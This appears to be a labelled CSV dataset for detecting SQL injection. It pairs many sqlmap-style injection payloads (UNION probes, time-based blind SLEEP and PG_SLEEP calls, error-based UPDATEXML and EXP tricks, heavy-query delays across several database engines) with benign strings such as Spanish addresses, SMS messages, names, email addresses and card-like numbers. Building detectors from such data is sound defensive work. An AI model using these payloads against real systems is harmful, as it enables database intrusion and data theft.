payload,label
964,0
"cbHd'))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- hKZb",1
"-2395' UNION ALL SELECT 7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706,7706-- fEOC",1
"calle antequeruela, 94, 7-a",0
"sexC"")) AS qwuh WHERE 4011=4011 RLIKE (SELECT 5509 FROM (SELECT(SLEEP(5)))OgYe)-- hQUm",1
"IIF(3132=8241,'',1/0)",1
"ronda outeiro, 13",0
48064800k,0
"-3783"" UNION ALL SELECT 9876,9876,9876,9876,9876,9876,9876,9876,9876,9876,9876,9876,9876,9876,9876,9876,9876,9876,9876,9876,9876,9876,9876,9876,9876,9876,9876-- uYqs",1
"DtRW OR ELT(6249=6249,SLEEP(5))",1
1251745617275774,0
"DtRW"") AND 4546 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (4546=4546) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113))) AND (""hYMr""=""hYMr",1
c/ badaia 10 10-h,0
"illas canarias, 64, 2?d",0
"-3378%""  )  )   union all select 9357,9357,9357,9357,9357--",1
49511678s,0
wheels,0
"' IN BOOLEAN MODE) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
6590914640490551,0
"1""  )  )   )  or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
"cbHd' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- xVEh",1
"||(SELECT (CHR(82)||CHR(69)||CHR(112)||CHR(67)) FROM DUAL WHERE 8273=8273 OR 4884=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))--",1
"sqlmap/1.4.4#stable (http://sqlmap.org)))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
18301326l,0
"-7753"" UNION ALL SELECT 8449,8449,8449,8449,8449,8449,8449,8449,8449,8449,8449,8449,8449,8449,8449,8449,8449,8449,8449,8449,8449,8449,8449,8449,8449,8449,8449,8449#",1
monsalve almada,0
clysdale8,0
47220,0
"' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- aWIc",1
"cbHd') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VksY",1
"-4870')) AS mJHl WHERE 8523=8523 OR 9643=CONCAT(CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113),(SELECT (CASE WHEN (9643=9643) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113))-- dGkW",1
9449003562445265,0
hello12,0
bangbang,0
pompey,0
"-3934) UNION ALL SELECT 7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430,7430-- CuXT",1
18128,0
"-7338 UNION ALL SELECT 2593,2593,2593,2593,2593,2593,2593,2593,2593,2593,2593,2593,2593,2593,2593,2593,2593,2593,2593,2593,2593,2593,2593,2593,2593-- cFlo",1
46814,0
cbHd' OR 8285=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND 'rHGV' LIKE 'rHGV,1
"bosquecillo, 137",0
"UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- MDhF",1
starr,0
"sexC') AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7176707171,(SELECT (ELT(6110=6110,1))),0x716a786a71)) USING utf8))) AND ('CChB' LIKE 'CChB",1
7062474051769610,0
waite,0
"-6395"") UNION ALL SELECT 5818,5818,5818,5818,5818,5818,5818,5818,5818,5818,5818,5818,5818,5818,5818,5818,5818,5818,5818,5818,5818,5818-- RIhs",1
"c/ escultor julio gonzalez 88,",0
"-9872) AS gbCI WHERE 8180=8180 UNION ALL SELECT 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#",1
"https://keystrokebiometrics.xyz:443/)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- aGFC",1
))) OR NOT 6761=7618 AND (((8219=8219,1
"cbHd"" AND 5254=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)--",1
-5626'))) ORDER BY 1-- IkQD,1
"calle lirios, 51, 3?a",0
196969,0
45182,0
vilar elsegui,0
0288508062311799,0
"c/ corint, 13 11?a",0
bunker,0
dybenko,0
jewish,0
29001,0
Mum hope you are having a great day. Hoping this text meets you well and full of life. Have a great day. Abiola,0
sixty9,0
deskjet,0
"DtRW' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
carteado,0
bubba69,0
"cbHd"") WHERE 9038=9038 AND 5461=DBMS_PIPE.RECEIVE_MESSAGE(CHR(107)||CHR(69)||CHR(121)||CHR(108),5)--",1
metrics,0
"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and 'kird' = 'kird",1
cisco,0
"') AND ROW(2454,3049)>(SELECT COUNT(*),CONCAT(0x7176707171,(SELECT (ELT(2454=2454,1))),0x716a786a71,FLOOR(RAND(0)*2))x FROM (SELECT 5207 UNION SELECT 2169 UNION SELECT 7376 UNION SELECT 5134)a GROUP BY x)-- uNuI",1
0strop5je0,0
That's fine have him give me a call if he knows what he wants or has any questions,0
!and5ajoso,0
"DtRW) AND 4424=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)-- MbnJ",1
haha but no money leh... Later got to go for tuition... Haha and looking for empty slots for driving lessons,0
alegre nomdedeu,0
"1"" where 6179=6179;begin user_lock.sleep(5); end--",1
""" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"TAAm) OR 9019=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND (6473=6473",1
"https://keystrokebiometrics.xyz:443/ WHERE 8301=8301 OR 8330=LIKE(CAST(X'41424344454647' AS TEXT),UPPER(HEX(RANDOMBLOB(500000000/2))))-- VaWP",1
"sqlmap/1.4.4#stable (http://sqlmap.org)"") OR (SELECT 8081 FROM (SELECT(SLEEP(5)))TMER) AND (""oTCl""=""oTCl",1
(SELECT 6706=(ASCII_CHAR(113)||ASCII_CHAR(118)||ASCII_CHAR(112)||ASCII_CHAR(113)||ASCII_CHAR(113)||(SELECT CASE 6706 WHEN 6706 THEN 1 ELSE 0 END FROM RDB$DATABASE)||ASCII_CHAR(113)||ASCII_CHAR(106)||ASCII_CHAR(120)||ASCII_CHAR(106)||ASCII_CHAR(113))),1
"DtRW) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
alfaro,0
"sqlmap/1.4.4#stable (http://sqlmap.org)""))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- imkr",1
gibson,0
77293077j,0
9589985001483437,0
amalie,0
45840,0
) WHERE 2367=2367 AND 6681=(SELECT 6681 FROM PG_SLEEP(5))--,1
keen,0
"-8053' UNION ALL SELECT 2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718,2718#",1
"c/ garcia mosquera, 184,",0
"cbHd UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"sexC')) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- DIrn",1
"vyHv) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"sqlmap/1.4.4#stable (http://sqlmap.org)||(SELECT CAST(X'63796966' AS TEXT) WHERE 2479=2479 AND 1180=LIKE(CAST(X'41424344454647' AS TEXT),UPPER(HEX(RANDOMBLOB(500000000/2)))))||",1
"-1755%' union all select 2615,2615,2615,2615,2615,2615#",1
20012001,0
"https://keystrokebiometrics.xyz:443/'||(SELECT 0x59694171 WHERE 1327=1327 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7176707171,(SELECT (ELT(2839=2839,1))),0x716a786a71)) USING utf8))))||'",1
pilocarpina,0
Sorry to be a pain. Is it ok if we meet another night? I spent late afternoon in casualty and that means i haven't done any of y stuff42moro and that includes all my time sheets and that. Sorry. ,0
Wrong phone! This phone! I answer this one but assume the other is people i don't well,0
Men like shorter ladies. Gaze up into his eyes.,0
03518,0
10836981w,0
Aiyo... Her lesson so early... I'm still sleepin haha... Okie u go home liao den confirm w me lor...,0
https://keystrokebiometrics.xyz:443/)) AND (SELECT (CASE WHEN (5963=6693) THEN NULL ELSE CAST((CHR(120)||CHR(70)||CHR(76)||CHR(74)) AS NUMERIC) END)) IS NULL AND ((6874=6874,1
"-9939' UNION ALL SELECT 3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892,3892#",1
"-9125"" UNION ALL SELECT 5322,5322,5322,5322,5322,5322,5322,5322,5322,5322,5322,5322,5322,5322,5322,5322,5322,5322,5322,5322,5322,5322,5322,5322,5322,5322,5322,5322,5322,5322,5322#",1
propaganda,0
vUXo)) RLIKE (SELECT (CASE WHEN (7023=7346) THEN 0x7655586f ELSE 0x28 END)) AND ((5058=5058,1
09301966f,0
I hope your pee burns tonite.,0
"vyHv AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7176707171,(SELECT (ELT(8568=8568,1))),0x716a786a71,0x78))x))# eLpo",1
Haha... can... But i'm having dinner with my cousin...,0
"-3319""))) OR (SELECT (CASE WHEN (7468=4273) THEN NULL ELSE CAST((CHR(74)||CHR(99)||CHR(83)||CHR(122)) AS NUMERIC) END)) IS NULL AND (((""URBL""=""URBL",1
lttecke,0
select  ( case when  ( 9130 = 1826 )  then 9130 else 9130* ( select 9130 from mysql.db )  end ) #,1
hughes,0
I‘ll leave around four ok?,0
"DtRW)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- bshd",1
Hey now am free you can call me.,0
"-6339"") UNION ALL SELECT 8916,8916,8916,8916,8916,8916,8916,8916,8916,8916,8916,8916,8916,8916,8916,8916,8916,8916,8916,8916,8916,8916,8916,8916#",1
I'm very happy for you babe ! Woo hoo party on dude!,0
4497,0
itziar,0
"-8485' UNION ALL SELECT 4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762,4762#",1
DtRW) AS hqOo WHERE 9068=9068 OR (SELECT 8322 FROM (SELECT(SLEEP(5)))YWoj)-- fiWx,1
Just wait till end of march when el nino gets himself. Oh.,0
guarda_sol,0
hastings,0
34347,0
It's é only $140 ard...É rest all ard $180 at least...Which is é price 4 é 2 bedrm ($900),0
"-1404)) UNION ALL SELECT 3283,3283,3283,3283,3283,3283,3283,3283,3283,3283-- Pmdl",1
ancho,0
"-9151' UNION ALL SELECT 3827,3827,3827,3827,3827,3827,3827,3827,3827,3827,3827,3827,3827,3827,3827,3827,3827#",1
55z8do,0
limitable,0
hfytnrb,0
vasilopo,0
TAAm')) AS Iyhd WHERE 3308=3308 OR 9182=(SELECT 9182 FROM PG_SLEEP(5))--,1
"https://keystrokebiometrics.xyz:443/) WHERE 6392=6392 OR 5823=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)-- vfre",1
"-8848"") WHERE 1192=1192 OR 7232=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (7232=7232) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113))-- yZFp",1
"')) OR 9177=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND (('HxDt'='HxDt",1
des7768ab9e6os,0
"glorieta farmaceutico perez jimenez 197,",0
"-7948 UNION ALL SELECT 6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301#",1
"DtRW'))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"https://keystrokebiometrics.xyz:443/') AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7176707171,(SELECT (ELT(2366=2366,1))),0x716a786a71,0x78))x)) AND ('Urnx' LIKE 'Urnx",1
"-7739' UNION ALL SELECT 7304,7304,7304,7304,7304-- QWfB",1
You should know now. So how's anthony. Are you bringing money. I've school fees to pay and rent and stuff like that. Thats why i need your help. A friend in need....|,0
mario,0
nolberto,0
"TAAm"" WHERE 4434=4434 AND CHAR(113)||CHAR(113)||CHAR(109)||CHAR(117)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5035),0),5000000000),NULL)-- TTmu",1
"1"";select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ""psbz""=""psbz",1
""" WHERE 5493=5493 AND ELT(8592=8592,SLEEP(5))-- CsMq",1
bravat-a,0
"') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- jYzY",1
-3584))) OR 4967=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (4967=4967) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND (((3380=3380,1
) AS aYSc WHERE 7675=7675 AND 1638=('qvpqq'||(SELECT CASE 1638 WHEN 1638 THEN 1 ELSE 0 END FROM RDB$DATABASE)||'qjxjq')-- ScpG,1
pandulfo,0
GENT! We are trying to contact you. Last weekends draw shows that you won a £1000 prize GUARANTEED. Call 09064012160. Claim Code K52. Valid 12hrs only. 150ppm ,0
-1802' or 7931=5841--,1
qazxcv,0
"-8700') UNION ALL SELECT 3781,3781,3781,3781,3781,3781,3781#",1
1)) as xbii where 2262=2262 or sleep(5)--,1
elche/elx,0
"1' )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( 'lfhx' = 'lfhx",1
39,0
"sexC""))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- oPzf",1
07101987,0
"DtRW')) UNION ALL SELECT NULL,NULL#",1
"-6363')) UNION ALL SELECT 2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292,2292-- Uudq",1
"vendrell, el",0
despacha!do,0
"1"" )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and  ( ""ubvd"" = ""ubvd",1
"vyHv' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"-3885') UNION ALL SELECT 2251,2251,2251,2251,2251,2251,2251,2251,2251,2251,2251,2251,2251,2251#",1
"TAAm')) AND 4490=DBMS_PIPE.RECEIVE_MESSAGE(CHR(89)||CHR(70)||CHR(120)||CHR(109),5) AND (('liRd'='liRd",1
zorita del maestrazgo,0
paulina,0
')) AS YRin WHERE 3196=3196;SELECT CASE WHEN 4051=6794 THEN 1 ELSE NULL END--,1
0a31e7a4,0
ilia,0
"c/ costa verde, 100 4c",0
https://keystrokebiometrics.xyz:443/);SELECT (CASE WHEN (4604=5280) THEN 4604 ELSE 4604*(SELECT 4604 FROM INFORMATION_SCHEMA.PLUGINS) END)#,1
"-8540'))) UNION ALL SELECT 9184,9184,9184,9184,9184,9184,9184-- Ycdd",1
"cbHd) WHERE 1335=1335 AND UPDATEXML(7500,CONCAT(0x2e,0x7176707171,(SELECT (ELT(7500=7500,1))),0x716a786a71),7878)-- kyNy",1
"1' and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'eimq'='eimq",1
m7124v3,0
"-5998')) UNION ALL SELECT 3402,3402,3402,3402,3402,3402,3402,3402,3402,3402-- DeoX",1
"1"") and 3732=3850 and (""edjv""=""edjv",1
"-9037')) AS TWfO WHERE 8229=8229 UNION ALL SELECT 8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229,8229-- JEuG",1
tenna1,0
95,0
"-8204) AS hRWX WHERE 5129=5129 UNION ALL SELECT 5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129,5129#",1
-8274'  )  )   union all select 3048--,1
-8470' UNION ALL SELECT 6690-- tVAe,1
adulatorio,0
"-2609' UNION ALL SELECT 5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952,5952#",1
-9152' OR 7257=CAST((CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (7257=7257) THEN BITCOUNT(BITSTRING_TO_BINARY((CHR(49)))) ELSE BITCOUNT(BITSTRING_TO_BINARY((CHR(48)))) END))::varchar||(CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC) AND 'sVJF' LIKE 'sVJF,1
7583890379589954,0
"paratge ter, 33,",0
potter,0
"cbHd"")) AS BmKF WHERE 7769=7769 AND 6281=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- Mpzy",1
3674,0
99019422y,0
pimping,0
"DtRW') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"-4619"") OR (6299=3944)*3944 AND (""eAFF""=""eAFF",1
7770,0
poboleda,0
castell-platja d'aro,0
"pl. santa isabel s/n, 8-d",0
12345678q,0
a5aranjada,0
44366,0
castello7,0
seiter.segev@mataluenga.bs,0
magdi,0
kristl@voragolive.vn,0
20041990,0
"-3606'))) UNION ALL SELECT 5308,5308,5308,5308,5308,5308,5308,5308,5308,5308,5308,5308,5308#",1
3,0
0908272174397466,0
mooses,0
"1'  )  )   or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and   (  (  'zjnp' = 'zjnp",1
trigueros del valle,0
"-7712' UNION ALL SELECT 6130,6130,6130,6130,6130,6130,6130,6130,6130,6130,6130,6130,6130,6130,6130,6130,6130,6130,6130,6130,6130,6130,6130,6130,6130,6130#",1
"1) as idvt where 3490=3490 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"c/ alqueria de rubiols, s/n, 11?d",0
-7215`) WHERE 4424=4424 ORDER BY 1406-- ucTa,1
"1""))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""frgb"" like ""frgb",1
"select count ( * )  from generate_series ( 1,5000000 ) #",1
"-9923"" UNION ALL SELECT 2452,2452,2452,2452,2452#",1
almera,0
-1459'))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((('eiet' like 'eiet,1
espuna,0
TAAm'))) AND 3693=(SELECT 3693 FROM PG_SLEEP(5)) AND ((('hwfL'='hwfL,1
Check Out Choose Your Babe Videos @ sms.shsex.netUN fgkslpoPW fgkslpo,0
"-7679"")) OR 7359=6829%16",1
"-3048"") OR (SELECT (CASE WHEN (6108=6108) THEN NULL ELSE CAST((CHR(110)||CHR(122)||CHR(73)||CHR(116)) AS NUMERIC) END)) IS NULL AND (""ToGj""=""ToGj",1
lukers,0
"-7472"") UNION ALL SELECT 7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260,7260#",1
"vyHv' WHERE 4833=4833 AND CHAR(68)||CHAR(104)||CHAR(68)||CHAR(104)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(1018),0),5000000000),NULL)--",1
qazxsw,0
18347,0
"https://keystrokebiometrics.xyz:443/'))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
Hi ....My engagement has been fixd on  &lt;#&gt; th of next month. I know its really shocking bt....hmm njan vilikkam....t ws al of a sudn;-(.,0
49622,0
"-2676"") AS sulc WHERE 8985=8985 OR 1 GROUP BY CONCAT(0x7176707171,(SELECT (CASE WHEN (6745=6745) THEN 1 ELSE 0 END)),0x716a786a71,FLOOR(RAND(0)*2)) HAVING MIN(0)#",1
"` WHERE 1831=1831 (SELECT (CASE WHEN (3312=3312) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL) ELSE CHAR(82)||CHAR(77)||CHAR(102)||CHAR(90) END) FROM (VALUES(0)))-- DNGT",1
raddalgo,0
) AND 3751=(CODE(113)||CODE(118)||CODE(112)||CODE(113)||CODE(113)||(SELECT CASE 3751 WHEN 3751 THEN CODE(49) ELSE CODE(48) END)||CODE(113)||CODE(106)||CODE(120)||CODE(106)||CODE(113))-- VUYi,1
berriz,0
cresta-da,0
5000,0
"`) WHERE 1531=1531 OR 7700=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)-- HnCf",1
"sqlmap/1.4.4#stable (http://sqlmap.org)"" AND ROW(5057,2281)>(SELECT COUNT(*),CONCAT(0x7176707171,(SELECT (ELT(5057=5057,1))),0x716a786a71,FLOOR(RAND(0)*2))x FROM (SELECT 7931 UNION SELECT 4089 UNION SELECT 4184 UNION SELECT 4634)a GROUP BY x) AND ""rzQF""=""rzQF",1
zoel,0
"TAAm"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"-6368)) union all select 4646,4646,4646,4646,4646,4646,4646--",1
"TAAm"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
1%');(select * from (select(sleep(5)))acdk)#,1
doobie,0
coo03inati3o,0
2301580169203669,0
